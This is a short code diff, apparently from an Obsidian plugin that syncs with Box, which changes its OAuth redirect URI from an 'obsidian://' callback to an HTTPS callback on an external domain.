@@ -21,7 +21,7 @@ const BOX_API = "https://api.box.com/2.0";
 const BOX_UPLOAD_API = "https://upload.box.com/api/2.0";
 const BOX_AUTH_URL = "https://account.box.com/api/oauth2/authorize";
 const BOX_TOKEN_URL = "https://api.box.com/oauth2/token";
-const REDIRECT_URI = `obsidian://${COMMAND_CALLBACK_BOX}`;
+const REDIRECT_URI = "https://bringyourowncloud.xyz/auth/box/callback";
 
 export const DEFAULT_BOX_CONFIG: BoxConfig = {
   accessToken: "",
